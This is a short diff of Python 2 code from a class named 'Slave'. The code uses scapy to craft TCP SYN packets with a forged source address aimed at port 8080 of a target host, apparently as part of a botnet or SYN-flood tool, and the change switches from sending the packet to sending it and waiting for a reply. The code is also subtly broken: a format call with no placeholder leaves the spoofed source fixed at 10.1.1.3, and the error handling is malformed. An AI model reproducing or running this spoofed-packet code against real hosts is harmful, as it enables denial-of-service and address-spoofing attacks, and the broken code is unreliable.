@@ -52,9 +52,9 @@ class Slave():
             src = "10.1.1.3".format(random.randint(0,255))
             spoofed_SYN =scapy.IP(dst=host,src=src)/scapy.TCP(dport=8080,sport=5000,flags='S')
             print spoofed_SYN
-            syn_ack= sr1(spoofed_SYN)
+            # scapy.send(spoofed_SYN)
+            syn_ack= scapy.sr1(spoofed_SYN)
             print syn_ack
-            scapy.send(spoofed_SYN)
         except error, msg:
             print error
             print msg
